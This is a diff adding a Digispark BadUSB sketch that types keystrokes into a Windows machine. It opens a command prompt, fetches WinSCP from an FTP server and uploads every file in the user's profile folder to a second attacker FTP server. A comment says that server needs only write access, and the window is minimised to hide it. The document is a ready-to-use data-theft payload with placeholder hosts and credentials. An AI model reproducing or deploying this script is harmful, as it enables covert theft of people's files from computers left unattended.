@@ -1,0 +1,34 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("cd %USERPROFILE%");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("ftp -i SERVER");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(800);
+  DigiKeyboard.print("USERNAME");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("PASSWORD");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("GET WinSCP.com");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("GET WinSCP.exe");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.print("quit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // FTP user only needs write access.
+  DigiKeyboard.print("WinSCP.com /command \"option batch abort\" \"option confirm off\" \"open ftp://USERNAME2:PASSWORD2@SERVER2\" \"put *.*\" \"close\" \"exit\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,44);
+  DigiKeyboard.print("N");
+}
